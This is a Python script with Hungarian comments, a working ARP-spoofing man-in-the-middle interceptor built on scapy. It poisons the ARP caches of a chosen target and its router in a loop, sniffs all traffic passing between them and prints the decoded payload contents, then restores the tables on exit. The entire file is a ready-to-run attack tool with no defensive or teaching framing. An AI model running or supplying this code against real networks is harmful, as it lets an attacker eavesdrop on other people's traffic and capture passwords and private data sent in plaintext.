import scapy.all as scapy
import time
import threading
import argparse
from scapy.layers.inet import IP, TCP, UDP, ICMP

# Terminál színek a profi megjelenéshez
RED, GREEN, YELLOW, CYAN, RESET = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[0m"

def get_arguments():
    parser = argparse.ArgumentParser(description="Integrated MitM Network Interceptor")
    parser.add_argument("-t", "--target", dest="target", help="Célpont IP", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway", help="Router IP", required=True)
    return parser.parse_args()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        # Pontos Layer 2 csomagküldés
        packet = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    dest_mac, src_mac = get_mac(destination_ip), get_mac(source_ip)
    if dest_mac and src_mac:
        packet = scapy.Ether(dst=dest_mac)/scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        scapy.sendp(packet, count=4, verbose=False)

def packet_callback(packet):
    """Csomagok mélyelemzése és adatkinyerés."""
    if IP in packet:
        src, dst = packet[IP].src, packet[IP].dst
        proto = "TCP" if packet.haslayer(TCP) else "UDP" if packet.haslayer(UDP) else "ICMP" if packet.haslayer(ICMP) else "OTHER"
        color = GREEN if proto == "TCP" else YELLOW if proto == "UDP" else RED if proto == "ICMP" else RESET
        
        print(f"{color}[{proto}]{RESET} {src} -> {dst}")
        
        # Nyers adatok (Payload) dekódolása
        if packet.haslayer("Raw"):
            try:
                load = packet["Raw"].load.decode('utf-8', 'ignore')
                if load.strip():
                    print(f"{CYAN}    └── 📦 DATA: {load[:100].replace('\n', ' ')}...{RESET}")
            except: pass

def spoof_loop(target, gateway):
    while running:
        spoof(target, gateway)
        spoof(gateway, target)
        time.sleep(2)

if __name__ == "__main__":
    args = get_arguments()
    running = True
    print(f"{CYAN}--- 🦈 NETWORK INTERCEPTOR SUITE ---{RESET}")
    
    try:
        # Spoofing szál indítása a háttérben
        st = threading.Thread(target=spoof_loop, args=(args.target, args.gateway), daemon=True)
        st.start()
        
        print(f"[*] Intercepting: {args.target} <-> {args.gateway}")
        print(f"[*] Sniffing active (Filter: Port 80)...")
        # A filter paramétert teljesen töröljük
        scapy.sniff(store=False, prn=packet_callback)
        
    except KeyboardInterrupt:
        running = False
        print(f"\n{YELLOW}[!] Leállítás és hálózat gyógyítása...{RESET}")
        restore(args.target, args.gateway)
        restore(args.gateway, args.target)
        print(f"{GREEN}[+] Siker.{RESET}")